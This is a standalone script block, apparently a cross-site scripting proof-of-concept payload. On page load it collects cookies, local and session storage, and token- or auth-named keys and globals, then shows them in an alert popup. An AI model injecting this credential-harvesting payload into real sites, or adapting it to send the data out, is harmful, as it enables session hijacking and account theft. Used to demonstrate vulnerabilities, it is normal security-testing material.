<script>
window.onload = function() {
  try {
    const url = location.href;
    const userAgent = navigator.userAgent;
    const cookies = document.cookie || "No cookies";

    const localStorageData = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      localStorageData[key] = localStorage.getItem(key);
    }

    const sessionStorageData = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      sessionStorageData[key] = sessionStorage.getItem(key);
    }

    const sensitiveData = {};
    const allKeys = [...Object.keys(localStorageData), ...Object.keys(sessionStorageData)];
    allKeys.forEach(key => {
      if (/token|auth|bearer|email|user/i.test(key)) {
        sensitiveData[key] = localStorageData[key] || sessionStorageData[key];
      }
    });

    const sensitiveGlobals = {};
    for (const key in window) {
      if (/token|auth|user|email/i.test(key) && typeof window[key] === 'string') {
        sensitiveGlobals[key] = window[key];
      }
    }

    const message = `
📄 URL: ${url}
🍪 Cookies: ${cookies}
📦 LocalStorage: ${JSON.stringify(localStorageData, null, 2)}
📥 SessionStorage: ${JSON.stringify(sessionStorageData, null, 2)}
🕵️‍♂️ Sensitive Data: ${JSON.stringify(sensitiveData, null, 2)}
🌐 Sensitive Globals: ${JSON.stringify(sensitiveGlobals, null, 2)}
    `;

    alert(message);

  } catch (error) {
    alert('Error: ' + error.message);
  }
};
</script>
